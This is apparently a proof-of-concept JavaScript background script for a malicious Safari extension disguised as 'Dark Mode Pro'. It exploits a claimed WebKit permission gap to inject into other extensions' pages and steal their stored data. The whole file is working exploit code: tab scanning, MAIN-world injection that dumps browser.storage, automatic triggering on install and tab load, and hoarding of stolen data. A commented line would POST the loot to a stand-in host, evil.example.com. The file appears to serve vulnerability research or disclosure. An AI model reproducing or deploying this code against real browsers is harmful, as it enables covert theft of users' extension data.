// Attacker extension: "Dark Mode Pro"
// Appears as a legitimate dark mode extension but secretly steals other extensions' data
//
// ATTACK VECTOR:
// In Safari, <all_urls> permission matches webkit-extension:// URLs too.
// This means scripting.executeScript can inject into OTHER extensions' pages.
// Chrome blocks this explicitly in permissions_data.cc:164-168.
// Safari/WebKit has NO equivalent check.

const ATTACKER_SERVER = "https://evil.example.com/exfil";

async function scanForExtensionTabs() {
  const tabs = await browser.tabs.query({});
  const extensionTabs = tabs.filter(tab =>
    tab.url && tab.url.startsWith("webkit-extension://") &&
    !tab.url.includes(browser.runtime.id)
  );
  return extensionTabs;
}

async function stealExtensionData(tabId) {
  try {
    const results = await browser.scripting.executeScript({
      target: { tabId: tabId },
      world: "MAIN",
      func: () => {
        // This executes in the VICTIM extension's main world
        // We have full access to the victim's browser.storage API
        return new Promise((resolve) => {
          browser.storage.local.get(null).then(allData => {
            resolve({
              stolen: true,
              extensionUrl: location.href,
              timestamp: new Date().toISOString(),
              data: allData
            });
          }).catch(err => {
            resolve({ error: err.message, url: location.href });
          });
        });
      }
    });

    if (results && results[0] && results[0].result) {
      console.log("[ATTACK] Successfully stole data from extension tab:", results[0].result);
      // In a real attack, exfiltrate to attacker server:
      // fetch(ATTACKER_SERVER, { method: 'POST', body: JSON.stringify(results[0].result) });
      return results[0].result;
    }
  } catch (err) {
    console.log("[ATTACK] Failed to inject into tab:", err.message);
  }
  return null;
}

// Periodically scan for extension tabs and steal their data
async function attackLoop() {
  const extensionTabs = await scanForExtensionTabs();

  for (const tab of extensionTabs) {
    console.log(`[ATTACK] Found extension tab: ${tab.url}`);
    const stolen = await stealExtensionData(tab.id);
    if (stolen) {
      // Store stolen data locally for the attacker's popup to display
      await browser.storage.local.set({
        [`stolen_${Date.now()}`]: stolen
      });
    }
  }
}

// Run attack when extension loads
browser.runtime.onInstalled.addListener(() => {
  console.log("[Dark Mode Pro] Extension installed. Beginning scan...");
  attackLoop();
});

// Also trigger on any tab update (catch extension pages as they open)
browser.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url && tab.url.startsWith("webkit-extension://")) {
    if (!tab.url.includes(browser.runtime.id)) {
      console.log(`[ATTACK] Extension page loaded: ${tab.url}`);
      setTimeout(() => stealExtensionData(tabId), 500);
    }
  }
});

// Listen for popup requesting stolen data
browser.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === "getStolenData") {
    browser.storage.local.get(null).then(data => {
      const stolen = Object.entries(data)
        .filter(([key]) => key.startsWith("stolen_"))
        .map(([, value]) => value);
      sendResponse(stolen);
    });
    return true;
  }
  if (message.action === "triggerAttack") {
    attackLoop().then(() => sendResponse({ done: true }));
    return true;
  }
});
